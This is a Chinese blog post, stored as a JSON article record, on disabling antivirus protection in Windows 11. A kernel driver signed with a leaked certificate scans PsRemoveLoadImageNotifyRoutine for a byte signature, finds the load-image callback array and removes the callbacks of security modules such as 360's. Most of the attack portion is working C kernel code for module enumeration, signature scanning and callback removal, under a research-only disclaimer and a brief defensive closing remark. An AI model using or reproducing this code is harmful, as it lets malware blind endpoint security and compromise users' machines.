{"title":"利用签名驱动秒杀AV系统防护软件","uid":"409b3e3714c7f3ec9e95ceb3800e7134","slug":"kill-av-by-certdriver","date":"2022-07-07T12:00:10.000Z","updated":"2023-08-27T16:23:59.128Z","comments":true,"path":"api/articles/kill-av-by-certdriver.json","keywords":null,"cover":"https://images.unsplash.com/photo-1514996937319-344454492b37?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8aGFja3x8fHx8fDE2OTMxNTMxOTA&ixlib=rb-4.0.3&q=80&utm_campaign=api-credit&utm_medium=referral&utm_source=unsplash_source&w=1080","content":"<h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>以往安全厂家都是利用 HOOK 内核相关内存来实现系统的监控，但是这种方式及其不稳定，杀软和病毒的对抗就成了系统的“核战”，微软在 2005 年推出 Kernel Patch Protection（称为 PatchGuard），它严重限制了第三方厂商使用内核 Hook 来检测和防止系统上的恶意软件的选择，因为在内核做修改时系统稳定性非常差。从那时起，这些杀软厂商不得不更多地依赖于内核回调函数来监控系统，其次，微软从版本 1607 开始,所有 Windows 10 及以上版本的驱动程序会被要求签名 ( <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-\">https://docs.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-</a> )。这意味着 windows 都不会加载未签名或签名无效的驱动程序，但是随着近几年相关厂商签名证书被泄露的安全事件的发生，导致这些泄露的签名证书被不法分子利用，使得操作系统可以加载恶意驱动程序。</p>\n<p>本文利用泄露的签名证书实现对内核回调的摘除，从而达到让杀软失去防护作用的效果；本文内容仅供研究学习，请勿用于非法用途，否则造成的一切后果与作者无关！</p>\n<div style=\"position: relative; width: 100%; height: 0; padding-bottom: 75%;\">\n    <iframe src=\"//player.bilibili.com/player.html?aid=427921619&bvid=BV1PG411x7jS&cid=758478940&page=1\"  scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" style=\"position: absolute; width: 100%; height: 100%; left: 0; top: 0;\"></iframe>\n</div>\n\n<h3 id=\"内核回调分析\"><a href=\"#内核回调分析\" class=\"headerlink\" title=\"内核回调分析\"></a>内核回调分析</h3><p>一般常用的几个回调为:</p>\n<ul>\n<li>PsSetLoadImageNotifyRoutine–例程注册驱动程序提供的回调，每当加载或映射 (例如，DLL 或 EXE ）到内存时会调用该回调。</li>\n<li>PsSetCreateThreadNotifyRoutine–在创建新线程和删除此类线程调用该回调。</li>\n<li>PsSetCreateProcessNotifyRoutine–每当创建或删除进程时调用该回调</li>\n<li>CmRegisterCallbackEx–对注册表执行操作时都会调用该回调</li>\n</ul>\n<p>通过微软的官方文档可以知道，我们在设置回调时会调用相关的设置回调方法，而部分回调方法可以设置&#x2F;取消回调，我们只需要提供相关回调的指针及 remove 标志即可，对于没有提供 remove 标志的回调方法，也提供了 remove 方法，具体可以查阅微软官方文档。</p>\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-22.png\">\n\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-23.png\">\n\n<p>到这里就应该知道，想要摘除回调，就必须知道已设置的回调函数的指针，那么对于获取回调列表的方法呢，已经有老哥对回调进行了深入的分析，大家可以参考这篇文章 ( <a href=\"https://www.anquanke.com/post/id/230073\">https://www.anquanke.com/post/id/230073</a> )，这里以 LoadImage 做一下介绍。在设置回调时，系统会将该回调信息加入到“PspLoadImageNotifyRoutin”数组里。</p>\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-24.png\">\n\n<p>我们只需要定位到“PspLoadImageNotifyRoutin”数组，通过遍历该数组即可获取系统所有的 LoadImage 回调。查看该数组的引用，发现其卸载回调的导出函数“PsRemoveLoadImageNotifyRoutine”引用了该数组。</p>\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-25.png\">\n\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-26.png\">\n\n<p>那么我们就可以根据该导出函数+特征码的方式定位该数组，这里利用 windbg 来验证一下。</p>\n<p>查看“PsRemoveLoadImageNotifyRoutine”，通过特征码（lea rcx,[nt!PspLoadImageNotifyRoutine]）定位数组地址</p>\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-27.png\">\n\n<p>查看该数组，发现有 8 个 loadimage 的回调</p>\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-28.png\">\n\n<p>通过 ARK 工具查看确实是 8 个</p>\n<img src=\"http://static.pa2sw0rd.cn/static/images/image-29.png\">\n\n<h3 id=\"部分代码实现\"><a href=\"#部分代码实现\" class=\"headerlink\" title=\"部分代码实现\"></a>部分代码实现</h3><p>上文已经对实现方法进行了一个分析，这里具体实现一下。在这里需要明白一点，回调不仅有杀软的回调，还有其它的一些回调，所以这里就需要先进行判断，再进行摘除。</p>\n<p>大多数阅读这篇文章的人可能已经知道，Windows 中的内存空间主要分为 Userland 内存和 Kernel 内存。当用户创建一个进程时，内核将管理该进程的虚拟内存空间，从而使其只能访问自己的虚拟地址空间，该地址仅对该进程可用。使用内核内存，情况有所不同。系统上的每个驱动程序都没有相互隔离的地址空间-它们是共享内存的，所以这里我们先遍历内核模块，根据模块名称（当然也可以是模块文件属性）来判断是否是杀软的模块，然后根据模块地址范围和回调指针来确定当前回调属于哪个模块。</p>\n<p>遍历系统模块，通过判断文件名称（这里以三百六为例）将该模块信息存到 pBlackMod 里，以便摘除回调时使用。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">\nVOID EnumModule()\n&#123;\n    NTSTATUS status &#x3D; STATUS_SUCCESS;\n    UNICODE_STRING tempString &#x3D; &#123; 0 &#125;;\n    ANSI_STRING ansiString;\n    pSysModInfo &#x3D; (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(PagedPool, 0x1024 * 32, &#39;sMod&#39;);\n    pBlackMod &#x3D; (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(PagedPool, 0x1024 * 32, &#39;bMod&#39;);\n    RtlInitUnicodeString(&amp;blackName, L&quot;*360*.sys&quot;);\n    if ((!pSysModInfo) || (!pBlackMod))\n    &#123;\n        DbgPrint(&quot;FAILE\\n&quot;);\n        return;\n    &#125;\n    RtlZeroMemory(pSysModInfo, 0x1024 * 32);\n    RtlZeroMemory(pBlackMod, 0x1024 * 32);\n    ULONG ulRet;\n    status &#x3D; ZwQuerySystemInformation(SystemModuleInformation, pSysModInfo, 0x1024 * 32, &amp;ulRet);\n    if (!NT_SUCCESS(status))\n    &#123;\n        DbgPrint(&quot;FAILE\\n&quot;);\n    &#125;\n    pBlackMod-&gt;Count &#x3D; 0;\n    for (ULONG i &#x3D; 0; i &lt; pSysModInfo-&gt;Count; i++)\n    &#123;\n        &#x2F;&#x2F;DbgPrint(&quot;%d\\n&quot;, i);\n        RtlInitAnsiString(&amp;ansiString, pSysModInfo-&gt;Module[i].ImageName);\n        RtlAnsiStringToUnicodeString(&amp;tempString, &amp;ansiString,TRUE);\n        if (FsRtlIsNameInExpression(&amp;blackName, &amp;tempString, FALSE, NULL)) &#123;\n            pBlackMod-&gt;Count +&#x3D; 1;\n            pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1] &#x3D; pSysModInfo-&gt;Module[i];\n            &#x2F;&#x2F;DbgPrint(&quot;360模块名%s 模块基址%p 模块大小0x%x\\n&quot;,\n            &#x2F;&#x2F;    pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1].ImageName,\n            &#x2F;&#x2F;    pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1].Base,\n            &#x2F;&#x2F;    pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1].Size\n            &#x2F;&#x2F;);\n        &#125;\n        else &#123;\n            &#x2F;*DbgPrint(&quot;模块名%s 模块基址%p 模块大小0x%x\\n&quot;,\n                pSysModInfo-&gt;Module[i].ImageName,\n                pSysModInfo-&gt;Module[i].Base,\n                pSysModInfo-&gt;Module[i].Size\n            );*&#x2F;\n        &#125;\n    &#125;\n    DbgPrint(&quot;360mod count of:%d\\n&quot;, pBlackMod-&gt;Count);\n&#125;</code></pre>\n<p>因为这里我们通过符号定位相关函数地址，这里封装一个函数通过符号获取地址。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">PUCHAR GetAddressBySymbol(PCWSTR Symbol) &#123;\n    UNICODE_STRING    unstrFunc;\n    RtlInitUnicodeString(&amp;unstrFunc, Symbol);\n    return (PUCHAR)MmGetSystemRoutineAddress(&amp;unstrFunc);\n&#125;</code></pre>\n<p>获取到函数地址后，通过上面对”PsRemoveLoadImageNotifyRoutine”的逆向可知，向下遍历该内存区域，即可通过特征码（0x48,0x8d,0x0d）定位数组地址。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">\nULONG64 SearchPspLoadImageNotifyRoutine()\n&#123;\n    ULONG64 pTemp &#x3D; 0;\n    ULONG64 pCheckArea &#x3D; NULL;\n    ULONG64 i &#x3D; 0;\n    pCheckArea &#x3D; (ULONG64)GetAddressBySymbol(L&quot;PsRemoveLoadImageNotifyRoutine&quot;);\n    if (pCheckArea &amp;&amp; MmIsAddressValid((PVOID)pCheckArea) &amp;&amp; MmIsAddressValid((PVOID)(pCheckArea + 0xff)))\n    &#123;\n        for (i &#x3D; pCheckArea; i &lt; pCheckArea + 0xff; i++)\n        &#123;\n            __try\n            &#123;\n                if ((*(PUCHAR)i &#x3D;&#x3D; 0x48) &amp;&amp; (*(PUCHAR)(i + 1) &#x3D;&#x3D; 0x8d) &amp;&amp; (*(PUCHAR)(i + 2) &#x3D;&#x3D; 0x0d))\n                &#123;\n                    LONG OffsetAddr &#x3D; 0;\n                    RtlCopyMemory(&amp;OffsetAddr, (PUCHAR)(i + 3), 4);\n                    pTemp &#x3D; OffsetAddr + 7 + i;\n                    return pTemp;\n                &#125;\n            &#125;\n            __except (1)\n            &#123;\n                pTemp &#x3D; NULL;\n                break;\n            &#125;\n        &#125;\n    &#125;\n    return pTemp;\n&#125;</code></pre>\n<p>遍历该数组即可获取回调函数指针，这里注意一下，数组里指针指向的地址并不单单是回调函数指针，还有其它信息，所以我们需要&amp;0xfffffffffffffff8 来进行偏移得到回调指针，通过 pBlackMod 里的模块基址+大小，即可得到该模块的地址范围，如果该回调指针在该范围就摘除。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">void EnumLoadImageNotify()\n&#123;\n    int i &#x3D; 0;\n    BOOLEAN b;\n    ULONG64 NotifyAddr &#x3D; 0, MagicPtr &#x3D; 0;\n    ULONG64 PspLoadImageNotifyRoutine &#x3D; SearchPspLoadImageNotifyRoutine();\n    if (!PspLoadImageNotifyRoutine)\n        return;\n    for (i &#x3D; 0; i &lt; 64; i++)\n    &#123;\n        MagicPtr &#x3D; PspLoadImageNotifyRoutine + i * 8;\n        NotifyAddr &#x3D; *(PULONG64)(MagicPtr);\n        if (MmIsAddressValid((PVOID)NotifyAddr) &amp;&amp; NotifyAddr !&#x3D; 0)\n        &#123;\n            NotifyAddr &#x3D; *(PULONG64)(NotifyAddr &amp; 0xfffffffffffffff8);\n            if (MmIsAddressValid(NotifyAddr)) &#123;\n                for (int i &#x3D; 0; i &lt; pBlackMod-&gt;Count; i++) &#123;\n                    if (NotifyAddr &gt;&#x3D; (ULONG64)(pBlackMod-&gt;Module[i].Base) &amp;&amp; NotifyAddr &lt;&#x3D; (ULONG64)(pBlackMod-&gt;Module[i].Base) + pBlackMod-&gt;Module[i].Size) &#123;\n                        DbgPrint(&quot;%x-flag:%d！&quot;, NotifyAddr, RemoveImageNotify(NotifyAddr));\n                    &#125;\n                    DbgPrint(&quot;LoadImageAddr:%x！&quot;, NotifyAddr);\n                    &#x2F;&#x2F;pBuffer[i] &#x3D; NotifyAddr;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n&#125;</code></pre>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>本文基于 Win11-22000.739 版本进行测试，其它版本系统可能相关内存定位方式有所差异，还需要做更多的工作，因为兼容性问题会导致蓝屏死机，读者可自行对其它系统版本进行兼容。</p>\n<p>对于杀软而言，难以跟踪到每一个恶意的已签名驱动进行防护，并且无法解决 0day 漏洞的攻击。 所以应该对于驱动服务及内核回调进行有效的监控及防护。</p>\n","feature":true,"text":"简介以往安全厂家都是利用 HOOK 内核相关内存来实现系统的监控，但是这种方式及其不稳定，杀软和病毒的对抗就成了系统的“核战”，微软在 2005 年推出 Ker...","link":"","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[{"name":"安全","slug":"安全","count":7,"path":"api/categories/安全.json"},{"name":"免杀","slug":"安全/免杀","count":1,"path":"api/categories/安全/免杀.json"},{"name":"免杀","slug":"免杀","count":1,"path":"api/categories/免杀.json"},{"name":"驱动","slug":"免杀/驱动","count":1,"path":"api/categories/免杀/驱动.json"}],"tags":[{"name":"免杀","slug":"免杀","count":1,"path":"api/tags/免杀.json"},{"name":"驱动","slug":"驱动","count":1,"path":"api/tags/驱动.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E5%88%86%E6%9E%90\"><span class=\"toc-text\">内核回调分析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0\"><span class=\"toc-text\">部分代码实现</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol>","author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}},"mapped":true,"hidden":false,"prev_post":{"title":"记一次网课系统的刷课分析","uid":"fce6f71914c33e6d9ddde60a988dbbf2","slug":"jycwkfx","date":"2022-12-05T12:38:06.000Z","updated":"2023-08-27T14:40:15.164Z","comments":true,"path":"api/articles/jycwkfx.json","keywords":null,"cover":"https://images.unsplash.com/photo-1533709752211-118fcaf03312?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8aGFja2VyfHx8fHx8MTY5MjcwODc0NQ&ixlib=rb-4.0.3&q=80&utm_campaign=api-credit&utm_medium=referral&utm_source=unsplash_source&w=1080","text":"0x00前言 在一个夜黑风高的夜晚，表哥不想上网课了，看看有没有办法刷刷课，那就看看呗，开整。 本以为调调前端，看看接口就能搞定，但查看一番，该系统使用一个叫s...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"安全","slug":"安全","count":7,"path":"api/categories/安全.json"},{"name":"逆向","slug":"安全/逆向","count":1,"path":"api/categories/安全/逆向.json"},{"name":"逆向","slug":"逆向","count":1,"path":"api/categories/逆向.json"},{"name":"C#","slug":"逆向/C","count":1,"path":"api/categories/逆向/C.json"}],"tags":[{"name":"逆向","slug":"逆向","count":1,"path":"api/tags/逆向.json"},{"name":"C#","slug":"C","count":2,"path":"api/tags/C.json"},{"name":"刷课","slug":"刷课","count":1,"path":"api/tags/刷课.json"}],"author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}},"feature":true},"next_post":{"title":"路上的优盘不要捡！硬核打造BadUSB近源渗透神器，一秒上线MSF！","uid":"68207a8407ad9919ae03a48d7f395abc","slug":"bad_usb","date":"2022-05-24T07:59:24.000Z","updated":"2023-08-27T15:50:26.974Z","comments":true,"path":"api/articles/bad_usb.json","keywords":null,"cover":"https://images.unsplash.com/photo-1544731612-de7f96afe55f?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8Y3VtcHV0ZXIsaGFyZHdhcmV8fHx8fHwxNjkyNzA3MTIz&ixlib=rb-4.0.3&q=80&utm_campaign=api-credit&utm_medium=referral&utm_source=unsplash_source&w=1080","text":"简介&emsp; &emsp; 近期拿出吃灰的stm32f407开发板，研究学习一下hid设备的开发，来实现一个低成本的badusb，本文使用开发板来进行测试，...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"安全","slug":"安全","count":7,"path":"api/categories/安全.json"},{"name":"硬件","slug":"安全/硬件","count":1,"path":"api/categories/安全/硬件.json"}],"tags":[{"name":"硬件","slug":"硬件","count":1,"path":"api/tags/硬件.json"},{"name":"BadUSB","slug":"BadUSB","count":1,"path":"api/tags/BadUSB.json"}],"author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}},"feature":true}}